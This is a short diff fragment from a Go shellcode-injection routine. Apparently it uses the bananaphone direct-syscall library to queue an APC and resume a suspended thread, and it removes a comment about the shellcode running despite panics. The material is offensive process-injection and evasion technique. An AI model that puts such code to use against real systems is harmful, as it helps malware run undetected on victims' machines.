@@ -119,7 +119,6 @@ func inject(ntQueueApcThread uint16, ntProtectVirtualMemory uint16, ntWriteVirtu
 		return
 	}
 
-	// Sometimes errors, sometime doesn't. Don't know why. Shellcode will always run but program will panic
 	ret, err = bananaphone.Syscall(ntResumeThread,
 		uintptr(pi.Thread),
 		0,
